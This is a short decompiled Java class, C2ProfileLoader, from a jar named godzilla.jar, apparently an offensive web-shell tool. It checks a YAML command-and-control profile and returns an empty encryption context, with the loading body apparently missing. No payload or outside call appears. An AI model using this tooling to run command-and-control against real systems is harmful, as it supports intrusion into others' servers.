/*    */ package core.c2profile;
/*    */ 
/*    */ import core.c2profile.cryption.CryptionContext;
/*    */ import java.io.ByteArrayInputStream;
/*    */ 
/*    */ public final class C2ProfileLoader
/*    */ {
/*    */   public static CryptionContext loadC2Profile(String yaml) {
/*  9 */     C2ProfileCheck.check(new ByteArrayInputStream(yaml.getBytes()));
/* 10 */     CryptionContext cryptionContext = new CryptionContext();
/*    */ 
/*    */ 
/*    */ 
/*    */     
/* 15 */     return cryptionContext;
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\core\c2profile\C2ProfileLoader.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */